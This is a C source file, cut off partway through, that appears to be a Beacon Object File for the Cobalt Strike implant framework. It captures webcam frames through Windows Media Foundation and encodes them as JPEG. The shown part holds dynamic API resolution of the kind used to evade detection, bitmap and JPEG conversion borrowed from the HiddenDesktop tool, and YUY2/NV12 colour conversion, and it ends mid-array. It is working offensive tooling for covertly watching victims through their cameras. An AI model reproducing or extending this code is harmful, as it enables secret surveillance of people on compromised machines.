#ifdef DECLSPEC_SELECTANY
#undef DECLSPEC_SELECTANY
#endif
#define DECLSPEC_SELECTANY
#define INITGUID
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strsafe.h>
#include <d3d9.h>
#include <mferror.h>
#include "mfapi.h"
#include <mfidl.h>
#include <mfreadwrite.h>
#include <stdbool.h>
#include <gdiplus.h>
#include <objidl.h> 

/* Avoid redefinitions from bofdefs.h */
#undef ZeroMemory
#define ZeroMemory(address, size) memset(address, 0, size)
#undef malloc

// #pragma comment(lib, "mf.lib")
// #pragma comment(lib, "mfplat.lib")
// #pragma comment(lib, "mfplay.lib")
// #pragma comment(lib, "mfreadwrite.lib")
// #pragma comment(lib, "mfuuid.lib")
// #pragma comment(lib, "wmcodecdspuuid.lib")

#ifdef BOF
#include "bofdefs.h"
#endif

#pragma region error_handling
#define print_error(msg, hr) _print_error(__FUNCTION__, __LINE__, msg, hr)
BOOL _print_error(char* func, int line, char* msg, HRESULT hr) {
#ifdef BOF
    //BeaconPrintf(CALLBACK_ERROR, "(%s at %d): %s 0x%08lx", func, line, msg, hr);
#else
    printf("[-] (%s at %d): %s 0x%08lx\n", func, line, msg, hr);
#endif
    return FALSE;
}
#pragma endregion

#define SAFE_RELEASE(p) do { if(p) { (p)->lpVtbl->Release(p); (p)=NULL; } } while(0)



/* Define our own constant GUIDs for video formats */
static const GUID s_MFVideoFormat_RGB32 = { 0x00000016, 0x0000, 0x0010, {0x80,0x00,0x00,0xaa,0x00,0x38,0x9b,0x71} };
static const GUID s_MFVideoFormat_RGB24 = { 0x00000017, 0x0000, 0x0010, {0x80,0x00,0x00,0xaa,0x00,0x38,0x9b,0x71} };
static const GUID s_MFVideoFormat_YUY2  = { 0x32595559, 0x0000, 0x0010, {0x80,0x00,0x00,0xaa,0x00,0x38,0x9b,0x71} };
static const GUID s_MFVideoFormat_NV12  = { 0x3231564E, 0x0000, 0x0010, {0x80,0x00,0x00,0xaa,0x00,0x38,0x9b,0x71} };

/* API function pointers */
typedef HANDLE (WINAPI* PFN_CreateFile)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
PFN_CreateFile pCreateFile = NULL;
typedef BOOL (WINAPI* PFN_WriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
PFN_WriteFile pWriteFile = NULL;
typedef BOOL (WINAPI* PFN_CloseHandle)(HANDLE);
PFN_CloseHandle pCloseHandle = NULL;
typedef HANDLE (WINAPI* PFN_FindFirstFile)(LPCSTR, LPWIN32_FIND_DATA);
PFN_FindFirstFile pFindFirstFile = NULL;
typedef BOOL (WINAPI* PFN_FindClose)(HANDLE);
PFN_FindClose pFindClose = NULL;
typedef VOID (WINAPI* PFN_DebugBreak)(void);
PFN_DebugBreak pDebugBreak = NULL;
typedef VOID (WINAPI* PFN_ZeroMemory)(PVOID, SIZE_T);
PFN_ZeroMemory pZeroMemory = NULL;
typedef VOID (WINAPI* PFN_CoTaskMemFree)(LPVOID);
PFN_CoTaskMemFree pCoTaskMemFree = NULL;
typedef HRESULT (WINAPI* PFN_CoInitializeEx)(LPVOID, DWORD);
PFN_CoInitializeEx pCoInitializeEx = NULL;

typedef HRESULT (WINAPI* PFN_MFGetStrideForBitmapInfoHeader)(REFGUID, UINT32, LONG*);
PFN_MFGetStrideForBitmapInfoHeader pMFGetStrideForBitmapInfoHeader = NULL;
typedef HRESULT (WINAPI* PFN_MFCreateAttributes)(IMFAttributes**, UINT32);
PFN_MFCreateAttributes pMFCreateAttributes = NULL;
typedef HRESULT (WINAPI* PFN_MFEnumDeviceSources)(IMFAttributes*, IMFActivate***, UINT32*);
PFN_MFEnumDeviceSources pMFEnumDeviceSources = NULL;
typedef HRESULT (WINAPI* PFN_MFCreateSourceReaderFromMediaSource)(IMFMediaSource*, IMFAttributes*, IMFSourceReader**);
PFN_MFCreateSourceReaderFromMediaSource pMFCreateSourceReaderFromMediaSource = NULL;
typedef void (WINAPI* PFN_MFCopyImage)(BYTE*, LONG, const BYTE*, LONG, DWORD, DWORD);
PFN_MFCopyImage pMFCopyImage = NULL;
typedef DWORD (WINAPI* PFN_GetCurrentProcessId)(void);
static PFN_GetCurrentProcessId    pGetCurrentProcessId = NULL;
typedef BOOL (WINAPI* PFN_ProcessIdToSessionId)(DWORD dwProcessId, DWORD* pSessionId);
static PFN_ProcessIdToSessionId   pProcessIdToSessionId = NULL;
typedef char* (__cdecl *PFN_getenv)(const char*);
static PFN_getenv pgetenv = NULL;
BOOL ResolveAPIs() {
    HMODULE hMSVCRT = GetModuleHandleA("msvcrt.dll");
    pgetenv = (PFN_getenv)GetProcAddress(hMSVCRT, "getenv");
    // Load Kernel32
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[ERROR] Failed to load kernel32.dll");
        return FALSE;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Loaded kernel32.dll at 0x%p", hKernel32);

    // Resolve Kernel32 APIs
    pGetCurrentProcessId = (PFN_GetCurrentProcessId)GetProcAddress(hKernel32, "GetCurrentProcessId");
    if (!pGetCurrentProcessId) return FALSE;
    pProcessIdToSessionId = (PFN_ProcessIdToSessionId)GetProcAddress(hKernel32, "ProcessIdToSessionId");
    if (!pProcessIdToSessionId) return FALSE;
    pCreateFile = (PFN_CreateFile)GetProcAddress(hKernel32, "CreateFileA");
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] CreateFileA at 0x%p", pCreateFile);
    if (!pCreateFile) return FALSE;

    pWriteFile = (PFN_WriteFile)GetProcAddress(hKernel32, "WriteFile");
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] WriteFile at 0x%p", pWriteFile);
    if (!pWriteFile) return FALSE;

    pCloseHandle = (PFN_CloseHandle)GetProcAddress(hKernel32, "CloseHandle");
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] CloseHandle at 0x%p", pCloseHandle);
    if (!pCloseHandle) return FALSE;

    pFindFirstFile = (PFN_FindFirstFile)GetProcAddress(hKernel32, "FindFirstFileA");
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] FindFirstFileA at 0x%p", pFindFirstFile);
    if (!pFindFirstFile) return FALSE;

    pFindClose = (PFN_FindClose)GetProcAddress(hKernel32, "FindClose");
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] FindClose at 0x%p", pFindClose);
    if (!pFindClose) return FALSE;

    pDebugBreak = (PFN_DebugBreak)GetProcAddress(hKernel32, "DebugBreak");
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] DebugBreak at 0x%p", pDebugBreak);
    if (!pDebugBreak) return FALSE;

    pZeroMemory = (PFN_ZeroMemory)GetProcAddress(hKernel32, "RtlZeroMemory");
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] RtlZeroMemory at 0x%p", pZeroMemory);
    if (!pZeroMemory) return FALSE;

    // Load Ole32
    HMODULE hOle32 = GetModuleHandleA("ole32.dll");
    if (!hOle32) hOle32 = LoadLibraryA("ole32.dll");
    if (!hOle32) {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[ERROR] Failed to load ole32.dll");
        return FALSE;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Loaded ole32.dll at 0x%p", hOle32);

    pCoTaskMemFree = (PFN_CoTaskMemFree)GetProcAddress(hOle32, "CoTaskMemFree");
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] CoTaskMemFree at 0x%p", pCoTaskMemFree);
    if (!pCoTaskMemFree) return FALSE;

    pCoInitializeEx = (PFN_CoInitializeEx)GetProcAddress(hOle32, "CoInitializeEx");
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] CoInitializeEx at 0x%p", pCoInitializeEx);
    if (!pCoInitializeEx) return FALSE;

    // Load MFPlat.dll
    HMODULE hMFPlat = GetModuleHandleA("mfplat.dll");
    if (!hMFPlat) hMFPlat = LoadLibraryA("mfplat.dll");
    if (!hMFPlat) {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[ERROR] Failed to load mfplat.dll");
        return FALSE;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Loaded mfplat.dll at 0x%p", hMFPlat);

    // Resolve valid MFPlat exports
    pMFCreateAttributes = (PFN_MFCreateAttributes)GetProcAddress(hMFPlat, "MFCreateAttributes");
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] MFCreateAttributes at 0x%p", pMFCreateAttributes);
    if (!pMFCreateAttributes) return FALSE;

    // Resolve MFGetStrideForBitmapInfoHeader
    pMFGetStrideForBitmapInfoHeader = (PFN_MFGetStrideForBitmapInfoHeader)GetProcAddress(hMFPlat, "MFGetStrideForBitmapInfoHeader");
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] MFGetStrideForBitmapInfoHeader at 0x%p", pMFGetStrideForBitmapInfoHeader);
    if (!pMFGetStrideForBitmapInfoHeader) return FALSE;

    pMFCopyImage = (PFN_MFCopyImage)GetProcAddress(hMFPlat, "MFCopyImage");
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] MFCopyImage at 0x%p", pMFCopyImage);
    if (!pMFCopyImage) return FALSE;

    // Load MF.dll
    HMODULE hMF = GetModuleHandleA("mf.dll");
    if (!hMF) hMF = LoadLibraryA("mf.dll");
    if (!hMF) {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[ERROR] Failed to load mf.dll");
        return FALSE;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Loaded mf.dll at 0x%p", hMF);

    pMFEnumDeviceSources = (PFN_MFEnumDeviceSources)GetProcAddress(hMF, "MFEnumDeviceSources");
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] MFEnumDeviceSources at 0x%p", pMFEnumDeviceSources);
    if (!pMFEnumDeviceSources) return FALSE;

    // Load MFReadWrite.dll
    HMODULE hMFReadWrite = GetModuleHandleA("mfreadwrite.dll");
    if (!hMFReadWrite) hMFReadWrite = LoadLibraryA("mfreadwrite.dll");
    if (!hMFReadWrite) {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[ERROR] Failed to load mfreadwrite.dll");
        return FALSE;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Loaded mfreadwrite.dll at 0x%p", hMFReadWrite);

    pMFCreateSourceReaderFromMediaSource = (PFN_MFCreateSourceReaderFromMediaSource)
        GetProcAddress(hMFReadWrite, "MFCreateSourceReaderFromMediaSource");
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] MFCreateSourceReaderFromMediaSource at 0x%p",pMFCreateSourceReaderFromMediaSource);
    if (!pMFCreateSourceReaderFromMediaSource) return FALSE;

    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] All required APIs resolved successfully");
    return TRUE;
}

/* Start of stuff ported from HiddenDesktop (i blatantly steal the bmp to jpeg function yet again)*/

// ---------------------------------------------------------------------------
// Typedefs for GDI+ functions
// ---------------------------------------------------------------------------

typedef GpStatus (WINAPI *PFN_GdiplusStartup)(ULONG_PTR*, const GdiplusStartupInput*, GdiplusStartupOutput*);
typedef VOID     (WINAPI *PFN_GdiplusShutdown)(ULONG_PTR);
typedef GpStatus (WINAPI *PFN_GdipCreateBitmapFromHBITMAP)(HBITMAP, HPALETTE, GpBitmap**);
typedef GpStatus (WINAPI *PFN_GdipDisposeImage)(GpImage*);
typedef GpStatus (WINAPI *PFN_GdipSaveImageToStream)(GpImage*, IStream*, const CLSID*, const EncoderParameters*);

// These two functions are also used in your bitmapToJpg function:
typedef GpStatus (WINAPI *PFN_GdipCreateBitmapFromStream)(IStream*, GpBitmap**);
typedef GpStatus (WINAPI *PFN_GdipCreateHBITMAPFromBitmap)(GpBitmap*, HBITMAP*, ARGB);
typedef HBITMAP (WINAPI* PFN_CreateBitmap)(int, int, UINT, UINT, const void*);
typedef HBITMAP (WINAPI* PFN_pCreateDIBSection)(HDC, const BITMAPINFO*, UINT, VOID**, HANDLE, DWORD);

// ---------------------------------------------------------------------------
// Global function pointer variables
// ---------------------------------------------------------------------------

static PFN_CreateBitmap pCreateBitmap = NULL;
static PFN_GdiplusStartup             pGdiplusStartup             = NULL;
static PFN_GdiplusShutdown            pGdiplusShutdown            = NULL;
static PFN_GdipCreateBitmapFromHBITMAP pGdipCreateBitmapFromHBITMAP = NULL;
static PFN_GdipDisposeImage           pGdipDisposeImage           = NULL;
static PFN_GdipSaveImageToStream      pGdipSaveImageToStream      = NULL;
static PFN_GdipCreateBitmapFromStream pGdipCreateBitmapFromStream = NULL;
static PFN_GdipCreateHBITMAPFromBitmap pGdipCreateHBITMAPFromBitmap = NULL;
static PFN_pCreateDIBSection pCreateDIBSection = NULL;
// ---------------------------------------------------------------------------
// ResolveGDIs: Loads gdiplus.dll and resolves the required functions
// ---------------------------------------------------------------------------
BOOL ResolveGDIs()
{
    // Attempt to get a handle to gdiplus.dll. If not loaded, load it.
    HMODULE hGdiPlus = GetModuleHandleA("gdiplus.dll");
    if (!hGdiPlus)
        hGdiPlus = LoadLibraryA("gdiplus.dll");
    if (!hGdiPlus)
        return FALSE;

    // Resolve each function and check for failure.
    pGdiplusStartup = (PFN_GdiplusStartup)GetProcAddress(hGdiPlus, "GdiplusStartup");
    if (!pGdiplusStartup)
        return FALSE;

    pGdiplusShutdown = (PFN_GdiplusShutdown)GetProcAddress(hGdiPlus, "GdiplusShutdown");
    if (!pGdiplusShutdown)
        return FALSE;

    pGdipCreateBitmapFromHBITMAP = (PFN_GdipCreateBitmapFromHBITMAP)GetProcAddress(hGdiPlus, "GdipCreateBitmapFromHBITMAP");
    if (!pGdipCreateBitmapFromHBITMAP)
        return FALSE;

    pGdipDisposeImage = (PFN_GdipDisposeImage)GetProcAddress(hGdiPlus, "GdipDisposeImage");
    if (!pGdipDisposeImage)
        return FALSE;

    pGdipSaveImageToStream = (PFN_GdipSaveImageToStream)GetProcAddress(hGdiPlus, "GdipSaveImageToStream");
    if (!pGdipSaveImageToStream)
        return FALSE;

    pGdipCreateBitmapFromStream = (PFN_GdipCreateBitmapFromStream)GetProcAddress(hGdiPlus, "GdipCreateBitmapFromStream");
    if (!pGdipCreateBitmapFromStream)
        return FALSE;

    pGdipCreateHBITMAPFromBitmap = (PFN_GdipCreateHBITMAPFromBitmap)GetProcAddress(hGdiPlus, "GdipCreateHBITMAPFromBitmap");
    if (!pGdipCreateHBITMAPFromBitmap)
        return FALSE;



    HMODULE hGdi32 = GetModuleHandleA("gdi32.dll");
    if (!hGdi32) hGdi32 = LoadLibraryA("gdi32.dll");
    if (!hGdi32) return FALSE;
    pCreateBitmap = (PFN_CreateBitmap)GetProcAddress(hGdi32, "CreateBitmap");
    if (!pCreateBitmap) {
        BeaconPrintf(CALLBACK_ERROR, "[ERROR] Failed to resolve CreateBitmap");
        return FALSE;
    }
    pCreateDIBSection = (PFN_pCreateDIBSection)GetProcAddress(hGdi32, "CreateDIBSection");
    if (!pCreateDIBSection) {
        BeaconPrintf(CALLBACK_ERROR, "[ERROR] Failed to resolve CreateDIBSection");
        return FALSE;
    }
    return TRUE;
}

/* modified slightly from the one in HiddenDesktop */
BOOL BitmapToJpeg(HBITMAP hBitmap, int quality, BYTE** pJpegData, DWORD* pJpegSize)
{
    // Ensure GDI+ APIs are resolved.
    if (!ResolveGDIs() ||
        !pGdiplusStartup || !pGdiplusShutdown || !pGdipCreateBitmapFromHBITMAP ||
        !pGdipDisposeImage || !pGdipSaveImageToStream)
    {
        return FALSE;
    }

    // Initialize GDI+ startup.
    GdiplusStartupInput gdiplusStartupInput;
    gdiplusStartupInput.GdiplusVersion = 1;
    gdiplusStartupInput.DebugEventCallback = NULL;
    gdiplusStartupInput.SuppressBackgroundThread = FALSE;
    gdiplusStartupInput.SuppressExternalCodecs = FALSE;

    ULONG_PTR gdiplusToken = 0;
    if (pGdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL) != Ok) {
        BeaconPrintf(CALLBACK_ERROR, "[DEBUG] GdiplusStartup failed");
        return FALSE;
    }

    // Create a GDI+ bitmap from the HBITMAP.
    GpBitmap* pGpBitmap = NULL;
    if (pGdipCreateBitmapFromHBITMAP(hBitmap, NULL, &pGpBitmap) != Ok) {
        BeaconPrintf(CALLBACK_ERROR, "[DEBUG] GdipCreateBitmapFromHBITMAP failed");
        pGdiplusShutdown(gdiplusToken);
        return FALSE;
    }

    // Create an IStream on a global memory handle.
    IStream* pStream = NULL;
    if (CreateStreamOnHGlobal(NULL, TRUE, &pStream) != S_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[DEBUG] CreateStreamOnHGlobal failed");
        pGdipDisposeImage((GpImage*)pGpBitmap);
        pGdiplusShutdown(gdiplusToken);
        return FALSE;
    }

    // Set up encoder parameters for JPEG quality.
    EncoderParameters encoderParams;
    encoderParams.Count = 1;
    CLSID clsidEncoderQuality = { 0x1d5be4b5, 0xfa4a, 0x452d, {0x9c, 0xdd, 0x5d, 0xb3, 0x51, 0x05, 0xe7, 0xeb} };
    encoderParams.Parameter[0].Guid = clsidEncoderQuality;
    encoderParams.Parameter[0].NumberOfValues = 1;
    encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].Value = &quality;

    // JPEG encoder CLSID.
    CLSID clsidJPEG = { 0x557cf401, 0x1a04, 0x11d3, {0x9a, 0x73, 0x00, 0x00, 0xf8, 0x1e, 0xf3, 0x2e} };

    // Save the image to the stream as JPEG.
    if (pGdipSaveImageToStream((GpImage*)pGpBitmap, pStream, &clsidJPEG, &encoderParams) != Ok) {
        BeaconPrintf(CALLBACK_ERROR, "[DEBUG] GdipSaveImageToStream failed");
        pStream->lpVtbl->Release(pStream);
        pGdipDisposeImage((GpImage*)pGpBitmap);
        pGdiplusShutdown(gdiplusToken);
        return FALSE;
    }

    // Obtain the size of the stream.
    LARGE_INTEGER liZero;
    liZero.QuadPart = 0;
    ULARGE_INTEGER uliSize;
    uliSize.QuadPart = 0;
    if (pStream->lpVtbl->Seek(pStream, liZero, STREAM_SEEK_END, &uliSize) != S_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Seek to end failed");
        pStream->lpVtbl->Release(pStream);
        pGdipDisposeImage((GpImage*)pGpBitmap);
        pGdiplusShutdown(gdiplusToken);
        return FALSE;
    }

    *pJpegSize = (DWORD)uliSize.QuadPart;
    *pJpegData = (BYTE*)malloc(*pJpegSize);
    if (!*pJpegData) {
        pStream->lpVtbl->Release(pStream);
        pGdipDisposeImage((GpImage*)pGpBitmap);
        pGdiplusShutdown(gdiplusToken);
        return FALSE;
    }

    // Seek back to the beginning of the stream.
    if (pStream->lpVtbl->Seek(pStream, liZero, STREAM_SEEK_SET, NULL) != S_OK) {
        free(*pJpegData);
        pStream->lpVtbl->Release(pStream);
        pGdipDisposeImage((GpImage*)pGpBitmap);
        pGdiplusShutdown(gdiplusToken);
        return FALSE;
    }

    // Read the JPEG data into our buffer.
    ULONG bytesRead = 0;
    if (pStream->lpVtbl->Read(pStream, *pJpegData, *pJpegSize, &bytesRead) != S_OK ||
        bytesRead != *pJpegSize)
    {
        free(*pJpegData);
        pStream->lpVtbl->Release(pStream);
        pGdipDisposeImage((GpImage*)pGpBitmap);
        pGdiplusShutdown(gdiplusToken);
        return FALSE;
    }

    // Cleanup.
    pStream->lpVtbl->Release(pStream);
    pGdipDisposeImage((GpImage*)pGpBitmap);
    pGdiplusShutdown(gdiplusToken);

    return TRUE;
}

/* End of stuff ported from HiddenDesktop */



void CreateBitmapFile(LPCWSTR fileName, long width, long height, WORD bitsPerPixel, BYTE* bitmapData, DWORD bitmapDataLength) {
    HANDLE file;
    BITMAPFILEHEADER fileHeader;
    BITMAPINFOHEADER fileInfo;
    DWORD writePosn = 0;
    file = pCreateFile((LPCSTR)fileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    fileHeader.bfType = 19778;
    fileHeader.bfSize = sizeof(fileHeader.bfOffBits) + sizeof(RGBTRIPLE);
    fileHeader.bfReserved1 = 0;
    fileHeader.bfReserved2 = 0;
    fileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    fileInfo.biSize = sizeof(BITMAPINFOHEADER);
    fileInfo.biWidth = width;
    fileInfo.biHeight = height;
    fileInfo.biPlanes = 1;
    fileInfo.biBitCount = bitsPerPixel;
    fileInfo.biCompression = BI_RGB;
    fileInfo.biSizeImage = width * height * (bitsPerPixel / 8);
    fileInfo.biXPelsPerMeter = 2400;
    fileInfo.biYPelsPerMeter = 2400;
    fileInfo.biClrImportant = 0;
    fileInfo.biClrUsed = 0;
    pWriteFile(file, &fileHeader, sizeof(fileHeader), &writePosn, NULL);
    pWriteFile(file, &fileInfo, sizeof(fileInfo), &writePosn, NULL);
    pWriteFile(file, bitmapData, bitmapDataLength, &writePosn, NULL);
    pCloseHandle(file);
}

int fileExists(TCHAR* file) {
    WIN32_FIND_DATA FindFileData;
    HANDLE handle = pFindFirstFile((LPCSTR)file, &FindFileData);
    int found = (handle != INVALID_HANDLE_VALUE);
    if (found) {
        pFindClose(handle);
    }
    return found;
}

/* VideoBufferLock */
typedef struct _VideoBufferLock {
    IMFMediaBuffer* pBuffer;
    IMF2DBuffer* p2DBuffer;
    BOOL bLocked;
} VideoBufferLock;

void VideoBufferLock_Init(VideoBufferLock* lock, IMFMediaBuffer* pBuffer) {
    lock->pBuffer = pBuffer;
    pBuffer->lpVtbl->AddRef(pBuffer);
    lock->p2DBuffer = NULL;
    lock->bLocked = FALSE;
    pBuffer->lpVtbl->QueryInterface(pBuffer, &IID_IMF2DBuffer, (void**)&(lock->p2DBuffer));
}

HRESULT VideoBufferLock_LockBuffer(VideoBufferLock* lock, LONG lDefaultStride, DWORD dwHeightInPixels, BYTE** ppbScanLine0, LONG* plStride) {
    HRESULT hr = S_OK;
    if (lock->p2DBuffer) {
        hr = lock->p2DBuffer->lpVtbl->Lock2D(lock->p2DBuffer, ppbScanLine0, plStride);
    } else {
        BYTE* pData = NULL;
        hr = lock->pBuffer->lpVtbl->Lock(lock->pBuffer, &pData, NULL, NULL);
        if (SUCCEEDED(hr)) {
            *plStride = lDefaultStride;
            if (lDefaultStride < 0)
                *ppbScanLine0 = pData + abs(lDefaultStride) * (dwHeightInPixels - 1);
            else
                *ppbScanLine0 = pData;
        }
    }
    lock->bLocked = SUCCEEDED(hr);
    return hr;
}

void VideoBufferLock_UnlockBuffer(VideoBufferLock* lock) {
    if (lock->bLocked) {
        if (lock->p2DBuffer)
            lock->p2DBuffer->lpVtbl->Unlock2D(lock->p2DBuffer);
        else
            lock->pBuffer->lpVtbl->Unlock(lock->pBuffer);
        lock->bLocked = FALSE;
    }
}

void VideoBufferLock_Cleanup(VideoBufferLock* lock) {
    VideoBufferLock_UnlockBuffer(lock);
    SAFE_RELEASE(lock->pBuffer);
    SAFE_RELEASE(lock->p2DBuffer);
}

/* ColorConverter */
typedef void (*IMAGE_TRANSFORM_FN)(BYTE* pDest, LONG lDestStride, const BYTE* pSrc, LONG lSrcStride, DWORD dwWidthInPixels, DWORD dwHeightInPixels);

typedef struct _ConversionFunction {
    GUID subtype;
    IMAGE_TRANSFORM_FN xform;
} ConversionFunction;

typedef struct _CColorConverter {
    UINT m_width;
    UINT m_height;
    LONG m_lDefaultStride;
    MFRatio m_PixelAR;
    MFVideoInterlaceMode m_interlace;
    IMAGE_TRANSFORM_FN m_convertFn;
} CColorConverter;

void CColorConverter_Init(CColorConverter* cc) {
    cc->m_convertFn = NULL;
}
void CColorConverter_Destroy(CColorConverter* cc) { }

static void TransformImage_RGB24(BYTE* pDest, LONG lDestStride, const BYTE* pSrc, LONG lSrcStride, DWORD dwWidthInPixels, DWORD dwHeightInPixels) {
    DWORD y, x;
    for (y = 0; y < dwHeightInPixels; y++) {
        RGBTRIPLE* pSrcPel = (RGBTRIPLE*)pSrc;
        DWORD* pDestPel = (DWORD*)pDest;
        for (x = 0; x < dwWidthInPixels; x++) {
            pDestPel[x] = D3DCOLOR_XRGB(pSrcPel[x].rgbtRed, pSrcPel[x].rgbtGreen, pSrcPel[x].rgbtBlue);
        }
        pSrc += lSrcStride;
        pDest += lDestStride;
    }
}

static void TransformImage_RGB32(BYTE* pDest, LONG lDestStride, const BYTE* pSrc, LONG lSrcStride, DWORD dwWidthInPixels, DWORD dwHeightInPixels) {
    pMFCopyImage(pDest, lDestStride, pSrc, lSrcStride, dwWidthInPixels * 4, dwHeightInPixels);
}

static void TransformImage_YUY2(
    BYTE* pDest, LONG lDestStride,
    const BYTE* pSrc, LONG lSrcStride,
    DWORD dwWidthInPixels, DWORD dwHeightInPixels)
{
    for (DWORD y = 0; y < dwHeightInPixels; y++) {
        RGBQUAD* pDestPel = (RGBQUAD*)pDest;
        WORD*    pSrcPel  = (WORD*)pSrc;

        for (DWORD x = 0; x < dwWidthInPixels; x += 2) {
            int y0 = (int)LOBYTE(pSrcPel[x]);
            int u0 = (int)HIBYTE(pSrcPel[x]);
            int y1 = (int)LOBYTE(pSrcPel[x + 1]);
            int v0 = (int)HIBYTE(pSrcPel[x + 1]);

            // Convert first pixel (Y0, U0, V0)
            int c = y0 - 16;
            int d = u0 - 128;
            int e = v0 - 128;
            
            // Red
            int valR = (298 * c + 409 * e + 128) >> 8;
            if (valR < 0)   valR = 0;
            if (valR > 255) valR = 255;
            BYTE r = (BYTE)valR;

            // Green
            int valG = (298 * c - 100 * d - 208 * e + 128) >> 8;
            if (valG < 0)   valG = 0;
            if (valG > 255) valG = 255;
            BYTE g = (BYTE)valG;

            // Blue
            int valB = (298 * c + 516 * d + 128) >> 8;
            if (valB < 0)   valB = 0;
            if (valB > 255) valB = 255;
            BYTE b = (BYTE)valB;

            pDestPel[x].rgbBlue     = b;
            pDestPel[x].rgbGreen    = g;
            pDestPel[x].rgbRed      = r;
            pDestPel[x].rgbReserved = 0;

            // Convert second pixel (Y1, same U/V)
            c = y1 - 16;
            valR = (298 * c + 409 * e + 128) >> 8;
            if (valR < 0)   valR = 0;
            if (valR > 255) valR = 255;
            r = (BYTE)valR;

            valG = (298 * c - 100 * d - 208 * e + 128) >> 8;
            if (valG < 0)   valG = 0;
            if (valG > 255) valG = 255;
            g = (BYTE)valG;

            valB = (298 * c + 516 * d + 128) >> 8;
            if (valB < 0)   valB = 0;
            if (valB > 255) valB = 255;
            b = (BYTE)valB;

            pDestPel[x + 1].rgbBlue     = b;
            pDestPel[x + 1].rgbGreen    = g;
            pDestPel[x + 1].rgbRed      = r;
            pDestPel[x + 1].rgbReserved = 0;
        }

        pSrc  += lSrcStride;
        pDest += lDestStride;
    }
}


static void TransformImage_NV12(BYTE* pDst, LONG dstStride, const BYTE* pSrc, LONG srcStride, DWORD dwWidthInPixels, DWORD dwHeightInPixels) {
    const BYTE* lpBitsY = pSrc;
    const BYTE* lpBitsCb = lpBitsY + (dwHeightInPixels * srcStride);
    const BYTE* lpBitsCr = lpBitsCb + 1;
    UINT y;
    for (y = 0; y < dwHeightInPixels; y += 2) {
        const BYTE* lpLineY1 = lpBitsY;
        const BYTE* lpLineY2 = lpBitsY + srcStride;
        const BYTE* lpLineCr = lpBitsCr;
        const BYTE* lpLineCb = lpBitsCb;
        BYTE* lpDibLine1 = pDst;
        BYTE* lpDibLine2 = pDst + dstStride;
        DWORD x;
        for (x = 0; x < dwWidthInPixels; x += 2) {
            int y0 = (int)lpLineY1[0];
            int y1 = (int)lpLineY1[1];
            int y2 = (int)lpLineY2[0];
            int y3 = (int)lpLineY2[1];
            int cb = (int)lpLineCb[0];
            int cr = (int)lpLineCr[0];
            int c = y0 - 16, d = cb - 128, e = cr - 128;
            BYTE r = (BYTE)((298 * c + 409 * e + 128) >> 8);
            BYTE g = (BYTE)((298 * c - 100 * d - 208 * e + 128) >> 8);
            BYTE b = (BYTE)((298 * c + 516 * d + 128) >> 8);
            lpDibLine1[0] = b; lpDibLine1[1] = g; lpDibLine1[2] = r; lpDibLine1[3] = 0;
            c = y1 - 16;
            r = (BYTE)((298 * c + 409 * e + 128) >> 8);
            g = (BYTE)((298 * c - 100 * d - 208 * e + 128) >> 8);
            b = (BYTE)((298 * c + 516 * d + 128) >> 8);
            lpDibLine1[4] = b; lpDibLine1[5] = g; lpDibLine1[6] = r; lpDibLine1[7] = 0;
            c = y2 - 16;
            r = (BYTE)((298 * c + 409 * e + 128) >> 8);
            g = (BYTE)((298 * c - 100 * d - 208 * e + 128) >> 8);
            b = (BYTE)((298 * c + 516 * d + 128) >> 8);
            lpDibLine2[0] = b; lpDibLine2[1] = g; lpDibLine2[2] = r; lpDibLine2[3] = 0;
            c = y3 - 16;
            r = (BYTE)((298 * c + 409 * e + 128) >> 8);
            g = (BYTE)((298 * c - 100 * d - 208 * e + 128) >> 8);
            b = (BYTE)((298 * c + 516 * d + 128) >> 8);
            lpDibLine2[4] = b; lpDibLine2[5] = g; lpDibLine2[6] = r; lpDibLine2[7] = 0;
            lpLineY1 += 2; lpLineY2 += 2; lpLineCr += 2; lpLineCb += 2;
            lpDibLine1 += 8; lpDibLine2 += 8;
        }
        pDst += (2 * dstStride);
        lpBitsY += (2 * srcStride);
        lpBitsCr += srcStride;
        lpBitsCb += srcStride;
    }
}

static const ConversionFunction s_FormatConversions[] = {
    { s_MFVideoFormat_RGB32, TransformImage_RGB32 },
